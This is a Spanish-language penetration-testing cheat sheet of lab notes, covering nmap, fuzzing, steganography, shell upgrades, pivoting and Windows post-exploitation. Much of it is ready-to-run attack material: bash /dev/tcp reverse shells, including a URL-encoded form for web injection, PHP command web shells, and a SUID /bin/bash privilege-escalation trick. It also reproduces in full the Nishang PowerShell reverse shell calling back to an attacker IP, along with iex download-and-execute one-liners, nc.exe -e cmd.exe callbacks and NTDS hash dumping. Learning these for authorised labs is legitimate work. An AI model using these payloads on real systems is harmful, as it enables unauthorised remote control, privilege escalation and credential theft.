# Acordeon

## S4vitar extractports


```bash

# Used: 
# nmap -p- --open -T5 -v -n ip -oG allPorts

# Extract nmap information
# Run as: 
# extractPorts allPorts
function extractPorts(){
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
	cat extractPorts.tmp; rm extractPorts.tmp
}
```

## Nmap

Para tirarle categorias de scripts para probar vulnerabilidades

```
nmap --script "vuln and safe" -p443 10.10.10.17.1 -oN Scan
```




## Stenografia

```
strings onm.jpg -n 10 #Lineas que tengan mas de 10 caracteres

```

Para ver los metadatos

```
exiftool omg.jpg
```

Datos escondidos

```
steghide info omg.jpg
```
Existen herramientas de fuenrza bruta que ayudan a esto busca "steghide brute force".



## Fully TTYs

```bash

script /dev/null -c bash
CTRL+Z
stty -echo raw;fg
    reset
export TERM=xterm
export SHELL=bash
stty size # por si no sabes las medidas de tu pantalla
stty rows  51 columns 189 # Patalla grande
stty rows  40 columns 167 # pantalla de lab viejita
```

## Python Fully TTY

> https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys

````python 

python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
````


## Spawn shells

Recuerda cuando estes en una web e intentes ejecutar una reverse shell. Cambia el & por %26 

```bash

bash -c "bash -i >%26 /dev/tcp/IP/port 0>%261"
bash -c "bash -i >& /dev/tcp/IP/port 0>&1"

```

## Sudo

```
sudo -u asuser whoami

```


## Enum

```
lsb_release -a
systemctl-timers
watch -n 1 ls -l /bin/bash # ver cada segundo ese comando
```

## Find 

```
find \-perm -4000 2>/dev/null #SUID

```

Buscar solo archivos dentro de una carpeta

```
find . -type f
```

Buscar arhivos solo en el la carpeta ( primer nivel) que empiecen por un punto

```
find /var/tmp -maxdepth 1 -type f -name ".*"
```

## SUID

```python

import os

os.system("chmod u+s /bin/bash")

```

## WFUZZ

```
wfuzz -c --hc=404 -t 200 -w rockyou.txt http://example.com/FUZZ
## Follow redirect
-L
## Esconder por tamaño total de caracteres
--hh=totaldecaracteres

```

Para poner mas palabras y que fuzze para meter un segundo payload.

```
wfuzz -c --hc=404 -t 200 -w rockyou.txt -z list,php-html http://example.com/FUZZ.FUZ2Z
```

Para enumerar los subdominios

```
wfuzz -c -t 200 --hh=11439 -w direcbotiry23medium.txt -H "FUZZ.cronos.htb"  http://example.com
```

## GOBuster

Para enumerar subdominios

```
gobuster vhost -u http://cronos.htb/ -w /subdomains.txt -t 200
```


## PHP reverse shell 


```php
<?php

echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";

?>

```
Existen variantes...

```php

<?php system($_GET['cmd']); ?>

```


## mkdir crear mas de un directorio 

```bash
mkdir -p /uno/subdirectorio2/tres
```


## Shebang

```bash
#!/bin/bash

chmod u+s /bin/bash

```

## Grep -P -E

### grep -E:

> La opción -E habilita el uso de expresiones regulares extendidas (ERE).En las expresiones regulares extendidas, ciertos caracteres especiales como +, ?, () tienen significados especiales sin necesidad de ser precedidos por un carácter de escape \.
Por ejemplo, con grep -E, puedes utilizar + para representar "uno o más repeticiones", y no necesitas escaparlo como \+.

```
grep -Ei "user|pass|note|key"

````

En el ejemplo anterior va a buscar esos strings es como or el | 

### grep -P 

> La opción -P habilita el uso de expresiones regulares de Perl (PCRE).Las expresiones regulares de Perl son más poderosas y flexibles que las expresiones regulares básicas (BRE) o extendidas (ERE).

> Permite utilizar la mayoría de las características avanzadas de Perl en las expresiones regulares, como el uso de (?...) para grupos no capturadores, lookaheads, lookbehinds, etc. Es especialmente útil si necesitas características más avanzadas que las proporcionadas por las expresiones regulares básicas o extendidas.


```
# Este ejemplo se usa el only match se activan las reg ex de perl y se escapa el punto despues se busca que despues del punto existan 40 caracteres
grep -oP '\.\w{40}'

```

## Enlace simbolico

Son como los accesos directos pero para linux existen otros enlaces aparte de los simbolicos los duros.

```
ln -s -f /root/root.txt index.html

ln: Es el comando para crear enlaces.
-s: Es la opción que indica que se debe crear un enlace simbólico.
-f: Es la opción que indica que, si ya existe un archivo llamado index.html, se debe sobrescribir sin preguntar.

```

## Ascii

```
man ascii
# Por ejemplo para imprimir el guion si es un bad char

printf "\055"; echo
guion=$(printf "\055")
## Ahora por ejemplo de hacer que el / que es un bad char supongamos que  la variable env es /

comando con guiones | sed 's/\//${HOME}/g' # esto lo que hace es donde encuentre un / lo va substituir por lo que valga $HOME
```

## Python break points

Para esto se necesita importar la libreria pdb 

```python3
#pip uninstall pyelftools -y
#pip install pyelftools==0.29

 
from pwn import * 

import requests
import pdb# break point--------------------------------------------------------------------------->
import signal#USas signal para capturar el CTRL+C
import sys
import urllib3
import time# aqui se usa time.sleep
import re # explresiones regulares

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)


#CTRL+C
signal.signal(signal.SIGINT, def_handler)

main_url="https://10.129.68.239/index.php"

def executeCommand():
        s=requests.session()
        urllib3.disable_warnings()
        s.verify = False
        r = s.get(main_url)
        pdb.set_trace()#break point------------------------------------------------------------->
        #print(r.text)<


if __name__== '__main__':
#       time.sleep(10)
        executeCommand()


```

Cuando ejecutas el programa entra en una especie de depurador de consola algunos comandos son: aprieta l

![image](https://github.com/gecr07/Acordeon/assets/63270579/ef1babf7-f3be-4693-a6a3-5ea5f907c6b7)

> https://realpython.com/python-debugging-pdb/

![image](https://github.com/gecr07/Acordeon/assets/63270579/92c89275-1dfd-41e2-ba62-a2f89265958d)

Ahora quiero ver la repuesta recuerda que al final por detras todo tiene clases entonces:

![image](https://github.com/gecr07/Acordeon/assets/63270579/f08b5052-a678-49fb-9cf5-bd9b4b21cfdf)

Nos va a mostrar el html:

![image](https://github.com/gecr07/Acordeon/assets/63270579/46e077e1-320d-4ca2-b790-d85eb6d0e98d)

## Terminal Shortcuts

```bash

Terminal 

CTRL + A #Ir al incio
CTRL + E # Ir al final 
ALT + B # Una palabra antes (Before)
ALT + F # Para adelante

Man 

CTRl + Shift #Buscar
n # para buscar adelante
shift + n ( osea N) # para buscar hacia atras
g Ir a la primera linea del manual man

TMUX

CTRL + B Shift + ! # Para un panel convertirlo en una ventana nueva.
CTRL + B Shift + [ # Para copiar se hace
Copy mode CTRL + Space # Selecciona 
CTRL + W # Eso es copia
CTRL + B + SHIFT + ] # pega lo copiado
#Buscar
Ya en el copy mode
CTRL + s
CTRL + r
n # para buscar en de abajo para arriba otra concidencia
SHIFT + n # para buscar en orden inverso.
```

> https://superuser.com/questions/231002/how-can-i-search-within-the-output-buffer-of-a-tmux-shell


## Batcat

```bash
batcat file -l ruby
```

## SSH enum

Esto se puede de la version < 7.79 (para abajo)  IGUAL CHECA PORQUE PUEDEN SALIR MAS VERCIONES EN EL FUTURO ESTO ES UNA GUIA NOMAS.

![image](https://github.com/gecr07/Acordeon/assets/63270579/fd6442e6-ffa2-484d-9f73-e8bfca42c944)


Para probar passwords

```
sshpass -p 'passwd' ssh user@127.0.0.1
```

Pero si buscas sshenum python3 salen scripts.

> https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py

![image](https://github.com/gecr07/Acordeon/assets/63270579/b53a5a8f-da0a-449f-8ce8-ca765caca76e)

## grep

Para buscar una palabra ( y que grep muestre la linea) y que inicie y acabe.

```
## -n imprime la linea
grep -n "^api$"
```

## Matar procesos (Kill killall)

![image](https://github.com/gecr07/Acordeon/assets/63270579/656f1836-1ecf-4f16-9de6-8532e9051523)

```
CTRL+Z
kill %
```

> El comando killall en Linux se utiliza para enviar una señal de terminación a procesos basándose en sus nombres. A diferencia del comando kill, que requiere especificar el ID del proceso (PID), killall permite matar procesos por su nombre.

```
killall openvpn
```

## HEX a ASCII (xxd)

Para pasar de hex a ascii usa:

```
xxd -ps -r;echo

```

## CEWL

Listas de palabras para brute force de lo mismo que esta en la pagina sirve por ejemplo para encontrar el usuario hype en Valentine (machine).

```
cewl -v --depth 2 --write lista.txt http://10.129.44.3/dev/

```

## Sponge

Escribir sobre el mismo archivo que modificaste (bastante util ahorra comandos y no acepta echos cuidado con eso)

```
cat id_rsa | tr -d ' ' | xxd -ps -r | sponge id_rsa
```


## id_rsa (600 y 700)

Son permisos que son validos (600 y 700).  En general, se recomienda que solo el propietario tenga acceso de lectura y escritura al archivo. 

```
chmod 600 id_rsa
```

## JTR (ssh2john)

```
john -w=/usr/share/wordlists/rockyou.txt hash
```

## Chown

![image](https://github.com/gecr07/Acordeon/assets/63270579/c369ca96-3758-4148-990e-dbd372b75df6)

Ahora para que los grupos puedan leer y escribir

```
chmod g+rw archivo
```

## Dirty Cow

 Esta vulnerablidad esta en kernels viejos. Esta entre el rango 2.6.22 < 3.9

```
searchsploit dirty cow 
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/374d5cb5-50ec-4ffb-b7f0-e431a9a6b9b0)


## XCLIP

Se usa para copiar de la consola al porta papeles.

```
cat file| xclip -sel clip 
```

## GCC compilar

En los exploit casi siempre te dice como compiarlo asi que busca como:

```
cat exploit.c | grep gcc
```

Para la compilacion

```
gcc exploit.c -o dirty_out
```

## Curl

Peticiones GET se puede hacer sin el -X para este tipo de peticiones.

```
curl -s -X GET "http://10.10.0.10/browse.php?file=something.txt"
```

## Borrar caracteres tr y grep -v

Para borrar caracteres usa el grep -v y el tr -d

```
cat file | tr -d '\n'
grep -v "00 00 00 00"
```

## Dynamic Port Fowarding SSH

Primero vamos a editar el archivo de configuracion de proxychains


```
nano /etc/proxychains.conf

socks4 127.0.0.1 1080

```

Segundo nos vamos a conectar a la maquina por ssh con la opcion -D

```
ssh user@10.10.1.8 -D 1080 # mismo puerto que el socks4 que definimos
```
Y en este ejemplo lo usan para comunicarse con el vncviewer en los puertos 5901

```
proxychains vncviwer -passwd secret_key 127.0.0.1:5901
```
Para usar nmap se tiene que usar la -sT afuerzas TCP connect

```
nmap -sT -p21,22,80 erev0s.com
```



##  Revisar puetos en uso (lsof)

Para revisar un puerto si esta en uso:

```
lsof -i:1080 
```

## Certificados SSL

Se puede checar con openssl.

```
openssl s_client -connect 10.10.14.1:443
```

Igual con sslscan 

```
sslscan https://10.10.1.1/
```

## Python pasar a hex

Para pasar a hex se hace asi.

```
python3
hex(10)
Nos regresa la 0xa
```
![image](https://github.com/gecr07/Acordeon/assets/63270579/35cf4197-6bbb-4803-8d78-315157d1e3ca)

## Procmon

Para ver procesos alternativa del pspy

```
#!/bin/bash

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v "procmon.sh" | grep -v "command"
	old_process=$new_process
done

```

## Permisos SUID

```
find \-perm -4000 2>/dev/null 
```

## Watch 

Para ver comandos cada segundo

```bash

watch -n 1 ls -la /bin/bash

```

## Telnet

A veces es mejor usar telenet en vez de nc consideralo.

```
telnet 10.10.1.14 110
```

## MSFVENOM

Para ver las payloads disponibles.

```
msfvenom -l payloads | grep java
```

## Multiples interfaces

Usa el comando

```
hostname -I

```
## Wget

Para descargar lo que sea copia y pega para que o estes escribiendo siempre lo mismo

```
wget http://10.10.14.80:8000/pspy
```

## Impacket

Tienen todas las herramientas para trabajar con AD entonces busca las tools primero con impacket ejemplo: impacket-secretsdump...

### secretsdump

Para sacar los hashes del ntds.dit recuerda que se necesita el registro system.bin

```
impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL
```

### smbserver

Para compartir una carpeta desde linux y verla en windows muy util cuando trabajas con windows...

```
impacket-smbserver smbFolder $(pwd)

```


## WPSCAN

Aqui tienes los comandos basicos para enumerar un WP

```
wpscan -v --disable-tls-checks --enumerate u,p --url  https://brainfuck.htb/

```

## Enumerar plugins sin WPSCAN ( es un check que se debe de hacer)

Me ha pasado que wpscan no te da los plugins que existen en la maquina. Se tiene que hacer manualmente.
```
find . -name \*plugin\* | grep -i wp
seclist/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt

```

Ojo esta lista ya tiene una ruta /wp-content/plugins entonces has fuzzing asi:


```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://10.129.1.185:80/webservices/wp/FUZZ 
```


## lsblk checar particiones

Sirve para ver como esta configurado el disco

```
lsblk

```

## Linpeas

Para que analices en la maquina atacante

```
# Victima
wget 10.10.14.80:8080/linpeas.sh
./linpeas.sh |  nc 10.10.14.80 9002

# Atacante
nc -lvnp 9002 | tee linpeas.out 

```


## Tar

Para comprimir un archivo con esta herramienta 

```
tar -zcvf /var/tmp/masa_out.gz /var/www/html
###
tar.gz
-z: La opción que indica a tar que debe usar gzip para comprimir el archivo.
-c: La opción que indica a tar que debe crear un nuevo archivo.
-v: La opción "verbose" que proporciona una salida detallada durante el proceso.
-f: La opción que permite especificar el nombre del archivo tar que se creará.

```
Para descomprimir 

```
tar -zxvf masa_out -C /directorio/out
###
-z: La opción que indica a tar que el archivo está comprimido con gzip y debe descomprimirse durante la extracción.
-x: La opción que indica a tar que debe extraer archivos del archivo tar.
-v: La opción "verbose" que proporciona una salida detallada durante el proceso.
-f: La opción que permite especificar el nombre del archivo tar del cual se extraerán los archivos. Debe ir seguido del nombre del archivo.

```

## Bash 

While con un or

```bash

# loop until there's a change in cur
echo "Waiting for archive filename to change..."
while [ "$start" == "$cur" -o "$cur" == "" ] ; do
    sleep 10;
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
done

```

Fuente > https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html

Un if que verifica si la variable tienen valor

```
if [ "$filename" ]; then
echo "El archivos tienen nombre..."
fi
```

## Tomcat

La ruta donde se encuentra el panel de control por defecto en un servido tomcat es:

```
http://localhost:8080/manager/html
```

# Windows

## Arquitecura x86 o x64

Saber la arquitectura de un sistema

```
echo %PROCESSOR_ARCHITECTURE%
```

Saber la arquitectura del sistema con "systeminfo"

```
systeminfo
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/9b123cd6-ed32-42b4-a551-26731068ad4c)


## Reverse shell for windows

> Nishang is a framework of scripts and payloads that enables using PowerShell for offensive security. I’ll show the reverse shell, but there is a ton more stuff in here.

> https://github.com/samratashok/nishang

###  Nishang (via Invoke-PowerShellTcp.ps1)


Entonces ponemos es linea hasta abajo del archivo con nuestra IP:

```powershell

function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.80 -Port 4444

```

Para descargar y en memoria:

```
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')
```

### RCE via nc

En kali seclist tiene nc.exe

![image](https://github.com/gecr07/Acordeon/assets/63270579/da729171-7475-4f3c-9968-2aafbc38b221)


```

\\10.10.14.80\share\nc.exe -e cmd.exe 10.10.14.80 443

```
> https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/


## Descargar archivos

Algunos comando no se pueden usar debido a las versiones de powershell por ejemplo el siguiente

```
Invoke-WebRequest -Uri 'http://192.168.230.128:8000/iisfinal.txt' -OutFile '.\iisfinal.txt'
```

Y la que por lo que entiendo carga ya el codigo en la memoria

```
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.80:8000/Invoke-PowerShellTcp.ps1')
```

### Certutil 

Esta herramienta es altamente detectada por windows ten cuidado...


```
certutil.exe -urlcache -split -f http://10.10.14.80:8000/iisfinal.txt iisfinal.txt

```


## Smb

Para ver los shares disponibles de una ip puedes usar:

![image](https://github.com/gecr07/Acordeon/assets/63270579/c61816ce-e938-4189-b6c1-9aab84145b70)


```
net view \\10.10.14.80
```

Ahora para ver que hay dentro el dir jala igualmente.

```
dir \\10.10.14.80\smbFolder
```

